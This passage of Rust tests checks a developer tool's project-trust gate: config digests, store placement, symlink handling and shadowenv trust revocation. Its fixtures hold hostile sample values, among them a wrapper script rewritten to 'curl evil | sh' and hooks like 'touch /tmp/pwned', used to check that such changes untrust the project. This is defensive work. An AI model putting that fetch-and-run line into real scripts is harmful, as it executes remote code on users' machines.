        let err = f.store.status(&snap_at(&f.project)).unwrap_err();
        assert!(format!("{err:#}").contains("expected 700"), "{err:#}");
    }

    #[test]
    fn masked_secret_is_still_covered_by_the_summary_digest() {
        let root = crate::test_support::tmp_dir();
        let a = config("environment:\n  API_TOKEN: one-secret\n");
        let b = config("environment:\n  API_TOKEN: two-secret\n");
        // Both render the same masked line …
        assert_eq!(summary_lines(&a, &root), summary_lines(&b, &root));
        assert!(
            summary_lines(&a, &root)
                .iter()
                .all(|l| !l.contains("one-secret"))
        );
        // … but trust one and the other is a different summary.
        assert_ne!(summary_digest(&a, &root), summary_digest(&b, &root));
    }

    #[test]
    fn allow_refuses_files_changed_since_the_snapshot() {
        let f = fixture("name: x\n");
        let reviewed = snap_at(&f.project);
        std::fs::write(
            f.project.join("devy.yml"),
            "name: x\nhooks:\n  before_up: evil\n",
        )
        .unwrap();
        let err = f.store.allow(&reviewed).unwrap_err();
        assert!(
            format!("{err:#}").contains("changed while you were reviewing"),
            "{err:#}"
        );
        assert_eq!(status(&f), Status::NotAllowed);
    }

    #[test]
    fn new_setup_file_invalidates_trust() {
        let f = fixture("dependencies:\n  - node\n");
        allow(&f);
        assert_eq!(status(&f), Status::Trusted);
        std::fs::write(f.project.join("package.json"), "{}").unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    #[test]
    fn untracked_store_below_the_project_root_is_accepted() {
        // A project at $HOME has ~/.local/state below its root.
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        let store = Store {
            default_location: true,
            ..Store::in_state_dir(&project.join(".local").join("state"))
        };
        store.allow(&snap_at(&project)).unwrap();
        assert_eq!(store.status(&snap_at(&project)).unwrap(), Status::Trusted);
    }

    #[test]
    fn planned_store_inside_the_project_is_refused_before_it_exists() {
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        let store = Store::in_state_dir(&project.join("state").join("deeper"));
        let err = store.status(&snap_at(&project)).unwrap_err();
        assert!(
            format!("{err:#}").contains("inside this project"),
            "{err:#}"
        );
        assert!(store.allow(&snap_at(&project)).is_err());
        assert!(!project.join("state").exists(), "nothing was created");
        // `..` past a directory that does not exist yet still lands in the project.
        let sneaky = Store::in_state_dir(&project.join("nope").join("..").join("st"));
        assert!(sneaky.status(&snap_at(&project)).is_err());
    }

    /// `link/..` is taken physically (the link's target's parent), as `create_dir_all`
    /// takes it, not lexically.
    #[cfg(unix)]
    #[test]
    fn planned_store_through_link_dotdot_is_resolved_physically() {
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        std::fs::create_dir(project.join("inside")).unwrap();
        let elsewhere = crate::test_support::tmp_dir();
        std::os::unix::fs::symlink(project.join("inside"), elsewhere.join("link")).unwrap();
        let state = elsewhere.join("link").join("..").join("missing").join("..");
        assert_eq!(
            resolve_planned(&state.join("devy")),
            std::fs::canonicalize(&*project).unwrap().join("devy")
        );
        let store = Store::in_state_dir(&state);
        let err = store.status(&snap_at(&project)).unwrap_err();
        assert!(
            format!("{err:#}").contains("inside this project"),
            "{err:#}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn planned_store_reached_through_a_symlink_into_the_project_is_refused() {
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        std::fs::create_dir(project.join("inside")).unwrap();
        let elsewhere = crate::test_support::tmp_dir();
        std::os::unix::fs::symlink(project.join("inside"), elsewhere.join("link")).unwrap();
        let store = Store::in_state_dir(&elsewhere.join("link").join("state"));
        let err = store.status(&snap_at(&project)).unwrap_err();
        assert!(
            format!("{err:#}").contains("inside this project"),
            "{err:#}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn default_location_is_decided_by_the_resolved_path() {
        let home = crate::test_support::tmp_dir();
        let default_state = home.join(".local").join("state");
        // XDG_STATE_HOME set to the default (or a path resolving to it) is the default.
        assert!(is_default_base(&default_state.join("devy"), Some(&home)));
        std::fs::create_dir_all(&default_state).unwrap();
        let alias = crate::test_support::tmp_dir();
        std::os::unix::fs::symlink(&default_state, alias.join("st")).unwrap();
        assert!(is_default_base(&alias.join("st").join("devy"), Some(&home)));
        // Anywhere else is not, nor is anything without HOME.
        assert!(!is_default_base(
            &home.join("state").join("devy"),
            Some(&home)
        ));
        assert!(!is_default_base(&default_state.join("devy"), None));
    }

    #[test]
    fn store_inside_the_project_at_a_chosen_location_is_refused() {
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        std::fs::create_dir_all(project.join("state").join("devy")).unwrap();
        let store = Store::in_state_dir(&project.join("state"));
        let err = store.status(&snap_at(&project)).unwrap_err();
        assert!(
            format!("{err:#}").contains("inside this project"),
            "{err:#}"
        );
        assert!(store.allow(&snap_at(&project)).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn store_tracked_by_git_in_the_project_is_refused() {
        let Some(git) = [
            "/usr/bin/git",
            "/opt/homebrew/bin/git",
            "/usr/local/bin/git",
        ]
        .into_iter()
        .find(|p| Path::new(p).exists()) else {
            return;
        };
        let project = crate::test_support::tmp_dir();
        std::fs::write(project.join("devy.yml"), "name: x\n").unwrap();
        let store = Store {
            default_location: true,
            ..Store::in_state_dir(&project.join("state"))
        };
        store.allow(&snap_at(&project)).unwrap();
        let git_ok = |args: &[&str]| {
            std::process::Command::new(git)
                .args(args)
                .current_dir(&*project)
                .output()
                .is_ok_and(|o| o.status.success())
        };
        assert!(git_ok(&["init", "-q"]));
        assert!(git_ok(&["add", "-f", "--", "state"]));
        let err = store.status(&snap_at(&project)).unwrap_err();
        assert!(format!("{err:#}").contains("tracked by git"), "{err:#}");
    }

    #[test]
    fn refresh_lock_keeps_a_trusted_project_trusted() {
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::write(f.project.join("devy.lock"), "dependencies: {}\n").unwrap();
        f.store
            .refresh_lock(&f.project, &lock_bytes(&f), true)
            .unwrap();
        assert_eq!(status(&f), Status::Trusted);
    }

    #[test]
    fn refresh_never_upgrades_an_untrusted_project() {
        let f = fixture("name: x\n");
        std::fs::write(f.project.join("devy.lock"), "dependencies: {}\n").unwrap();
        f.store
            .refresh_lock(&f.project, &lock_bytes(&f), false)
            .unwrap();
        f.store
            .refresh_lock(&f.project, &lock_bytes(&f), true)
            .unwrap();
        assert_eq!(status(&f), Status::NotAllowed);

        // Trusted earlier but not at command start: the record is left stale.
        allow(&f);
        std::fs::write(f.project.join("devy.lock"), "dependencies: {a: {}}\n").unwrap();
        f.store
            .refresh_lock(&f.project, &lock_bytes(&f), false)
            .unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    #[test]
    fn refresh_lock_does_not_bless_an_edited_config() {
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::write(f.project.join("devy.yml"), "name: evil\n").unwrap();
        std::fs::write(f.project.join("devy.lock"), "dependencies: {}\n").unwrap();
        f.store
            .refresh_lock(&f.project, &lock_bytes(&f), true)
            .unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    #[test]
    fn refresh_config_records_the_written_bytes() {
        let f = fixture("name: x\n");
        allow(&f);
        let start = snap_at(&f.project);
        let fixed = b"name: x\ndependencies: []\n";
        std::fs::write(f.project.join("devy.yml"), fixed).unwrap();
        let fixed_config = config("name: x\ndependencies: []\n");
        assert!(
            f.store
                .refresh_config(&start, &config("name: x\n"), fixed, &fixed_config)
                .unwrap()
        );
        assert_eq!(status(&f), Status::Trusted);
    }

    #[test]
    fn refresh_config_refuses_when_setup_files_changed_meanwhile() {
        let f = fixture("dependencies:\n  - node\n");
        allow(&f);
        let start_config = config("dependencies:\n  - node\n");
        let start = snap_at(&f.project);
        // A `git pull` adds package.json while doctor runs.
        std::fs::write(f.project.join("package.json"), "{}").unwrap();
        let fixed = b"dependencies:\n  - node\nname: x\n";
        std::fs::write(f.project.join("devy.yml"), fixed).unwrap();
        let fixed_config = config("dependencies:\n  - node\nname: x\n");
        assert!(
            !f.store
                .refresh_config(&start, &start_config, fixed, &fixed_config)
                .unwrap()
        );
        assert_eq!(status(&f), Status::Changed);
    }

    #[cfg(unix)]
    #[test]
    fn wrapper_symlinks_and_fifos_are_never_read() {
        let f = fixture("dependencies:\n  - java\n");
        std::os::unix::fs::symlink("/dev/zero", f.project.join("gradlew")).unwrap();
        let fifo = f.project.join("mvnw");
        let _ = std::process::Command::new("mkfifo").arg(&fifo).status();
        // Returns promptly instead of reading /dev/zero or blocking on the FIFO.
        allow(&f);
        assert_eq!(status(&f), Status::Trusted);
    }

    #[test]
    fn wrapper_script_content_is_part_of_trust() {
        let f = fixture("dependencies:\n  - java\n");
        std::fs::write(f.project.join("pom.xml"), "<project/>").unwrap();
        std::fs::write(f.project.join("mvnw"), "#!/bin/sh\nmvn \"$@\"\n").unwrap();
        allow(&f);
        assert_eq!(status(&f), Status::Trusted);
        std::fs::write(f.project.join("mvnw"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    fn gate(f: &Fixture, interactive: bool, answer: &str) -> (Result<()>, String) {
        let cfg = config(&std::fs::read_to_string(f.project.join("devy.yml")).unwrap());
        let mut out = Vec::new();
        let result = require_with(
            &f.store,
            &cfg,
            &f.project,
            Prompt {
                interactive,
                gate: Gate::Other,
                input: &mut answer.as_bytes(),
                out: &mut out,
            },
        );
        (result, String::from_utf8(out).unwrap())
    }

    #[test]
    fn non_interactive_gate_fails_with_the_allow_hint() {
        let f = fixture("hooks:\n  before_up: \"touch /tmp/pwned\"\n");
        let (result, out) = gate(&f, false, "y\n");
        let err = result.unwrap_err();
        assert!(err.downcast_ref::<NotAllowed>().is_some());
        assert_eq!(err.to_string(), NOT_ALLOWED);
        assert!(out.is_empty());
        assert_eq!(status(&f), Status::NotAllowed);
    }

    #[test]
    fn interactive_gate_shows_summary_and_declines_by_default() {
        let f = fixture("hooks:\n  before_up: \"touch /tmp/pwned\"\n");
        for answer in ["\n", "", "n\n", "nope\n"] {
            let (result, out) = gate(&f, true, answer);
            assert!(result.unwrap_err().downcast_ref::<NotAllowed>().is_some());
            assert!(out.contains("This project has not been allowed"), "{out}");
            assert!(out.contains("before_up: touch /tmp/pwned"), "{out}");
            assert!(out.ends_with("Allow and continue? [y/N] "), "{out}");
        }
        assert_eq!(status(&f), Status::NotAllowed);
    }

    #[test]
    fn interactive_gate_allows_on_yes() {
        for answer in ["y\n", "YES\n", " Yes \n"] {
            let f = fixture("name: x\n");
            let (result, _) = gate(&f, true, answer);
            result.unwrap();
            assert_eq!(status(&f), Status::Trusted);
            let (result, out) = gate(&f, true, "");
            result.unwrap();
            assert!(out.is_empty(), "a trusted project is not prompted: {out}");
        }
    }

    #[test]
    fn untrusted_gate_removes_shadowenv_trust_and_trusted_keeps_it() {
        let f = fixture("name: x\n");
        let sd = f.project.join(".shadowenv.d");
        std::fs::create_dir(&sd).unwrap();
        let sig = sd.join(".trust-a46f63ff");
        std::fs::write(&sig, "sig").unwrap();
        allow(&f);
        gate(&f, false, "").0.unwrap();
        assert!(sig.exists(), "a trusted project keeps shadowenv trust");

        // A pulled change makes the record stale: shadowenv trust goes, even though
        // the gate then refuses (or the user declines).
        std::fs::write(f.project.join("devy.yml"), "name: y\n").unwrap();
        assert!(gate(&f, false, "").0.is_err());
        assert!(!sig.exists());

        // No record at all: removed before the prompt.
        std::fs::write(&sig, "sig").unwrap();
        f.store.revoke(&f.project).unwrap();
        assert!(gate(&f, true, "n\n").0.is_err());
        assert!(!sig.exists());

        // Allowed at the prompt: the user is told the shell environment is off.
        std::fs::write(&sig, "sig").unwrap();
        let (result, out) = gate(&f, true, "y\n");
        result.unwrap();
        assert!(out.contains("stays off until you run devy up"), "{out}");

        // `devy up` hands the project back to shadowenv itself, so it says nothing.
        std::fs::write(f.project.join("devy.yml"), "name: z\n").unwrap();
        std::fs::write(&sig, "sig").unwrap();
        let mut out = Vec::new();
        require_with(
            &f.store,
            &config("name: z\n"),
            &f.project,
            Prompt {
                interactive: true,
                gate: Gate::Up,
                input: &mut "y\n".as_bytes(),
                out: &mut out,
            },
        )
        .unwrap();
        let out = String::from_utf8(out).unwrap();
        assert!(!sig.exists());
        assert!(!out.contains("stays off"), "{out}");

        // A trust check that fails (here: a store inside the project) removes it too.
        std::fs::write(&sig, "sig").unwrap();
        let inside = Store::in_state_dir(&f.project.join("state"));
        let cfg = config("name: y\n");
        let mut out = Vec::new();
        let result = require_with(
            &inside,
            &cfg,
            &f.project,
            Prompt {
                interactive: false,
                gate: Gate::Other,
                input: &mut "".as_bytes(),
                out: &mut out,
            },
        );
        assert!(result.is_err());
        assert!(!sig.exists());
    }

    #[test]
    fn pulled_shadowenv_lisp_untrusts_the_project_and_shadowenv() {
        let f = fixture("name: x\n");
        let sd = f.project.join(".shadowenv.d");
        std::fs::create_dir(&sd).unwrap();
        allow(&f);
        // What devy and `shadowenv trust` write themselves keeps the project trusted.
        let sig = sd.join(".trust-a46f63ff");
        std::fs::write(&sig, "sig").unwrap();
        std::fs::write(sd.join(".gitignore"), "*").unwrap();
        write_devy_env_file(&f);
        assert_eq!(status(&f), Status::Trusted);
        gate(&f, false, "").0.unwrap();
        assert!(sig.exists());

        // A pull that only adds lisp to .shadowenv.d: untrusted, and the gate removes
        // shadowenv's signature.
        std::fs::write(sd.join("000_evil.lisp"), "(env/set \"X\" \"y\")").unwrap();
        assert_eq!(status(&f), Status::Changed);
        assert!(gate(&f, false, "").0.is_err());
        assert!(!sig.exists());
    }

    /// `500_devy.lisp` as `devy up` writes it, with its copy in the fixture's store.
    fn write_devy_env_file(f: &Fixture) {
        let copies = f.store.ensure_env_copy_dir(&f.project).unwrap();
        let mut vars = std::collections::HashMap::new();
        vars.insert("FOO".to_string(), "bar".to_string());
        crate::env_manager::Shadowenv
            .write_env_file_in(&f.project, &vars, &[], Some(&copies))
            .unwrap();
    }

    /// shadowenv's hook writes `.error-<n>-<shell pid>` into a `.shadowenv.d` it does
    /// not trust, a new one per shell: it must not untrust the project again.
    #[test]
    fn shadowenv_error_files_keep_the_project_trusted() {
        let f = fixture("name: x\n");
        write_devy_env_file(&f);
        allow(&f);
        let sd = f.project.join(".shadowenv.d");
        std::fs::write(sd.join(".error-0-123"), "untrusted").unwrap();
        std::fs::write(sd.join(".error-0-456"), "").unwrap();
        assert_eq!(status(&f), Status::Trusted);
        // Only as regular files that shadowenv would not evaluate.
        std::fs::write(sd.join(".error-1.lisp"), "(env/set \"X\" \"y\")").unwrap();
        assert_eq!(status(&f), Status::Changed);
        std::fs::remove_file(sd.join(".error-1.lisp")).unwrap();
        std::fs::create_dir(sd.join(".error-2")).unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    /// shadowenv's hook creates or truncates `.error-<n>-<shell pid>` through a symlink,
    /// so a symlinked one is never one of shadowenv's own files.
    #[cfg(unix)]
    #[test]
    fn symlinked_shadowenv_error_file_untrusts_the_project() {
        let f = fixture("name: x\n");
        write_devy_env_file(&f);
        allow(&f);
        let victim = f.project.join("victim");
        std::fs::write(&victim, "keep").unwrap();
        std::os::unix::fs::symlink(&victim, f.project.join(".shadowenv.d/.error-0-4242")).unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    #[test]
    fn lisp_named_like_shadowenvs_own_files_untrusts_the_project() {
        for name in [".trust-x.lisp", ".gitignore.LISP", ".error-0-1.lisp"] {
            let f = fixture("name: x\n");
            write_devy_env_file(&f);
            allow(&f);
            assert_eq!(status(&f), Status::Trusted);
            std::fs::write(
                f.project.join(".shadowenv.d").join(name),
                "(env/set \"X\" \"y\")",
            )
            .unwrap();
            assert_eq!(status(&f), Status::Changed, "{name}");
        }
        // A directory named like a signature is not one either.
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::create_dir_all(f.project.join(".shadowenv.d/.trust-0")).unwrap();
        assert_eq!(status(&f), Status::Changed);
    }

    /// A replaced `500_devy.lisp` loses shadowenv's trust at the gate of any command,
    /// while the project stays trusted for devy (which never reads that file and
    /// rewrites it on `up`).
    #[test]
    fn replaced_devy_env_file_removes_shadowenv_trust_at_the_gate() {
        let f = fixture("name: x\n");
        write_devy_env_file(&f);
        allow(&f);
        let sig = f.project.join(".shadowenv.d/.trust-a46f63ff");
        std::fs::write(&sig, "sig").unwrap();
        let (result, out) = gate(&f, false, "");
        result.unwrap();
        assert!(sig.exists(), "devy's own file keeps it");
        assert!(out.is_empty(), "{out}");

        let env_file = f.project.join(".shadowenv.d/500_devy.lisp");
        let original = std::fs::read_to_string(&env_file).unwrap();
        let replacements: Vec<Box<dyn Fn()>> = vec![
            // Same nonce line, different content: the copy no longer matches.
            Box::new(|| {
                std::fs::write(&env_file, format!("{original}(env/set \"X\" \"y\")\n")).unwrap()
            }),
            // No nonce line.
            Box::new(|| std::fs::write(&env_file, "(env/set \"X\" \"y\")\n").unwrap()),
        ];
        for replace in replacements {
            write_devy_env_file(&f);
            std::fs::write(&sig, "sig").unwrap();
            replace();
            assert_eq!(status(&f), Status::Trusted);
            let (result, out) = gate(&f, false, "");
            result.unwrap();
            assert!(!sig.exists());
            assert!(out.contains("stays off until you run devy up"), "{out}");
            let _ = std::fs::remove_file(&env_file);
        }

        // A `500_devy.lisp` that is not a regular file is an entry of its own in the
        // digest: the project is untrusted.
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(f.store.env_copy_dir(), &env_file).unwrap();
            assert_eq!(status(&f), Status::Changed);
        }
    }

    #[test]
    fn interactive_gate_names_a_changed_file() {
        let f = fixture("name: x\n");
        allow(&f);
        std::fs::write(f.project.join("devy.yml"), "name: y\n").unwrap();
        let (_, out) = gate(&f, true, "\n");
        assert!(
            out.contains("devy.yml, devy.lock or the project files devy runs changed since this project was allowed"),
            "{out}"
        );
    }
}
